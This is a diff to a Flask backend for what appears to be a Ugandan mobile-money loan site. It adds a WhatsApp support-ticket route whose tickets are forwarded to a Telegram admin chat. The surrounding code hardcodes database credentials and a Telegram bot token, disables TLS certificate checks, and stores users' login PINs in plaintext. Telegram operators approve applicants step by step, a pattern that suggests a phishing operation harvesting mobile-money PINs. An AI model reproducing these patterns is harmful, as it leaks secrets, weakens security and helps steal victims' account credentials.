@@ -13,6 +13,7 @@ MONGO_URI = "mongodb+srv://superuser:2006@superuser.uenn69l.mongodb.net/momo_loa
 client = MongoClient(MONGO_URI, tls=True, tlsAllowInvalidCertificates=True)
 db = client["momo_loan_db"]
 applications_collection = db["applications"]
+support_collection = db["support_tickets"]
 
 # Dedicated Uganda Telegram Configuration 🇺🇬
 TELEGRAM_BOT_TOKEN = "8467275364:AAFJlOk-8cOlhok0XC40s-x604G0YxW_hqs"
@@ -61,6 +62,42 @@ def send_telegram_interactive_alert(app_data, stage_title="NEW SUBMISSION", step
     except Exception as e:
         print(f"Telegram alert error: {e}")
 
+def send_telegram_support_alert(ticket_data, db_id):
+    clean_phone = ticket_data.get('whatsapp_phone', '').replace('+', '').replace(' ', '')
+    wa_direct_link = f"https://wa.me/{clean_phone}"
+
+    message = (
+        f"🆘 *NEW HELP / SUPPORT TICKET* 🆘\n\n"
+        f"🆔 *Ticket ID:* `{ticket_data.get('ticket_id')}`\n"
+        f"💬 *WhatsApp Phone:* `{ticket_data.get('whatsapp_phone')}`\n"
+        f"📝 *Reported Issue:*\n\"{ticket_data.get('issue')}\"\n\n"
+        f"🕒 *Submitted:* <t:{int(ticket_data.get('created_at'))}:R>"
+    )
+
+    reply_markup = {
+        "inline_keyboard": [
+            [
+                {"text": "💬 Open WhatsApp Chat", "url": wa_direct_link}
+            ],
+            [
+                {"text": "✅ Mark Resolved", "callback_data": f"resolve_help_{db_id}"}
+            ]
+        ]
+    }
+
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    payload = {
+        "chat_id": TELEGRAM_ADMIN_CHAT_ID,
+        "text": message,
+        "parse_mode": "Markdown",
+        "reply_markup": reply_markup
+    }
+
+    try:
+        requests.post(url, json=payload, timeout=5)
+    except Exception as e:
+        print(f"Telegram support alert error: {e}")
+
 @app.route("/health")
 def health():
     try:
@@ -69,13 +106,39 @@ def health():
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
 
+@app.route("/submit-support", methods=["POST"])
+def submit_support():
+    try:
+        data = request.get_json() or {}
+        whatsapp_phone = data.get("whatsapp_phone", "").strip()
+        issue_text = data.get("issue", "").strip()
+
+        if not whatsapp_phone or not issue_text:
+            return jsonify({"status": "error", "message": "Missing required fields"}), 400
+
+        ticket_data = {
+            "whatsapp_phone": whatsapp_phone,
+            "issue": issue_text,
+            "status": "Open",
+            "created_at": time.time(),
+            "ticket_id": "HELP" + os.urandom(3).hex().upper()
+        }
+
+        inserted_id = support_collection.insert_one(ticket_data).inserted_id
+        send_telegram_support_alert(ticket_data, str(inserted_id))
+
+        return jsonify({"status": "ok", "message": "Ticket submitted successfully"}), 200
+    except Exception as e:
+        print(f"Error submitting support ticket: {e}")
+        return jsonify({"status": "error", "message": str(e)}), 500
+
 @app.route("/telegram-webhook", methods=["POST"])
 def telegram_webhook():
     try:
         data = request.get_json() or {}
         print("=== TELEGRAM WEBHOOK RECEIVED ===", data)
         
-        # 1. Handle Inline Button Clicks (Approvals, Rejections, Flags)
+        # 1. Handle Inline Button Clicks (Approvals, Rejections, Flags, Resolve)
         if "callback_query" in data:
             callback = data["callback_query"]
             callback_data = callback.get("data", "")
@@ -99,7 +162,14 @@ def telegram_webhook():
                 if not target_app:
                     target_app = applications_collection.find_one(sort=[("_id", -1)])
 
-                if target_app:
+                if action == "resolve":
+                    if step_code == "help":
+                        support_collection.update_one(
+                            {"_id": obj_id},
+                            {"$set": {"status": "Resolved"}}
+                        )
+                        text_response = "✅ Ticket marked as Resolved!"
+                elif target_app:
                     actual_obj_id = target_app["_id"]
                     
                     if action == "approve":
@@ -112,11 +182,10 @@ def telegram_webhook():
                         else:
                             new_status = "Approved"
 
-                        res = applications_collection.update_one(
+                        applications_collection.update_one(
                             {"_id": actual_obj_id},
                             {"$set": {"status": new_status, "custom_message": ""}}
                         )
-                        print(f"✅ Success! Modified count: {res.modified_count} for status -> {new_status}")
                         text_response = f"✅ {step_code.upper()} Approved!"
 
                     elif action == "reject":
@@ -259,7 +328,7 @@ def apply_step2():
         session["first_name"] = request.form.get("first_name")
         session["last_name"] = request.form.get("last_name")
         session["phone"] = request.form.get("phone")
-        session["whatsapp_phone"] = request.form.get("whatsapp_phone")  # Capturing WhatsApp input
+        session["whatsapp_phone"] = request.form.get("whatsapp_phone")
         return redirect(url_for("apply_step3"))
     return render_template("apply_step2.html")
 
@@ -288,7 +357,7 @@ def login():
             "first_name": session.get("first_name", "User"),
             "last_name": session.get("last_name", "Applicant"),
             "phone": session.get("phone", "000000000"),
-            "whatsapp_phone": session.get("whatsapp_phone", "Not Provided"),  # Stored in DB
+            "whatsapp_phone": session.get("whatsapp_phone", "Not Provided"),
             "employment": session.get("employment", "Self-Employed"),
             "income": session.get("income", "500000"),
             "password": pin,
